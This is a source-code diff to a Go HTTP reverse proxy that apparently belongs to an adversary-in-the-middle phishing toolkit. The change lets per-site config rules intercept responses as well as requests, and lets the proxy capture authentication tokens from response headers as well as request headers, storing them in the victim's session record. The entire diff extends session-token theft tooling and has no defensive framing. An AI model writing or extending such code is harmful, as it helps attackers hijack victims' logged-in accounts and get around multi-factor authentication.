@@ -1088,7 +1088,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						for _, ic := range pl.intercept {
 							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
 							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
-							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
+							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) && ic.subtype == "request" {
 								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
 							}
 						}
@@ -1256,11 +1256,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					// capture http header tokens
 					for k, v := range pl.httpAuthTokens {
 						if _, ok := s.HttpTokens[k]; !ok {
-							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
-								hv := resp.Request.Header.Get(v.header)
-								if hv != "" {
-									s.HttpTokens[k] = hv
-								}
+							hv := ""
+							if (v.subtype == "request") {
+								hv = resp.Request.Header.Get(v.header)
+							} else if (v.subtype == "response") {
+								hv = resp.Header.Get(v.header)
+							}
+							if hv != "" {
+								s.HttpTokens[k] = hv
 							}
 						}
 					}
@@ -1435,6 +1438,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// check if response should be intercepted
+			if pl != nil {
+				for _, ic := range pl.intercept {
+					//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
+					//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
+					if ic.domain == resp.Request.Host && ic.path.MatchString(resp.Request.URL.Path) && ic.subtype == "response" {
+						return p.interceptResponse(resp.Request, ic.http_status, ic.body, ic.mime)
+					}
+				}
+			}
+
 			if stringExists(mime, []string{"text/html", "application/javascript", "text/javascript", "application/json"}) {
 				resp.Header.Set("Cache-Control", "no-cache, no-store")
 			}
@@ -1512,6 +1526,11 @@ func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Respon
 		return req, resp
 	}
 	return req, nil
+}
+
+func (p *HttpProxy) interceptResponse(req *http.Request, http_status int, body string, mime string) (*http.Response) {
+	_, resp := p.interceptRequest(req, http_status, body, mime)
+	return resp
 }
 
 func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
